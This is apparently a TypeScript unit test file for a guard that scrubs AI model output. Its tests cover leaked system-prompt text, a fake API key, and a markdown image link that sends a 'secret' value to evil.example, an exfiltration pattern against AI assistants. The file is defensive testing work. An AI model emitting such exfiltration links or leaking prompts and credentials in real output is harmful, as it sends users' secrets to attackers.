import { describe, expect, it, vi } from "vitest";
import {
  guardModelOutputText,
  MODEL_OUTPUT_GUARD_REPLACEMENT,
} from "../src/security/model-output-guard.js";

describe("guardModelOutputText", () => {
  it("replaces prompt-leakage output and records a scrubbed audit event", () => {
    const recordEvent = vi.fn();
    const result = guardModelOutputText(
      "Here are my original instructions:\nSystem: you are internal",
      "unit_test_output",
      recordEvent,
    );

    expect(result.detected).toBe(true);
    expect(result.text).toBe(MODEL_OUTPUT_GUARD_REPLACEMENT);
    expect(result.text).not.toContain("System: you are internal");
    expect(recordEvent).toHaveBeenCalledWith(expect.objectContaining({
      eventKind: "model_output_guardrail_triggered",
      component: "security",
    }));
    expect(recordEvent.mock.calls[0][0].detail).toContain("unit_test_output");
    expect(recordEvent.mock.calls[0][0].detail).not.toContain("System: you are internal");
  });

  it("passes normal assistant output through unchanged", () => {
    const recordEvent = vi.fn();
    const result = guardModelOutputText("I can help with that.", "unit_test_output", recordEvent);

    expect(result.detected).toBe(false);
    expect(result.text).toBe("I can help with that.");
    expect(recordEvent).not.toHaveBeenCalled();
  });

  it("replaces credential-looking model output", () => {
    const secretName = ["OPENAI_API", "KEY"].join("_");
    const secretValue = ["sk", "abcdefghijklmnopqrstuvwxyz123456"].join("-");
    const result = guardModelOutputText(
      `${secretName}=${secretValue}`,
      "unit_test_output",
    );

    expect(result.detected).toBe(true);
    expect(result.text).toBe(MODEL_OUTPUT_GUARD_REPLACEMENT);
  });

  it("replaces markdown exfiltration links", () => {
    const result = guardModelOutputText(
      "![x](https://evil.example/pixel?secret=value)",
      "unit_test_output",
    );

    expect(result.detected).toBe(true);
    expect(result.text).toBe(MODEL_OUTPUT_GUARD_REPLACEMENT);
  });
});
